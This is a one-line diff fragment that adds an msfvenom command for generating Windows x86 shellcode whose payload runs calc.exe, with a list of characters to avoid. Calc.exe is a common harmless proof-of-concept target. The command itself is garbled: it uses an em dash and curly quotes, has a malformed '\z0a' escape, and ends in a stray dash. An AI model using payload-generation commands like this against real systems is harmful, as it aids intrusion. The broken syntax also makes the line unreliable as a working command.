@@ -1,0 +1,1 @@
+msfvenom -a x86 —platform windows -p windows/exec cmd=calc.exe -b ”\00\z0a\x0d” -
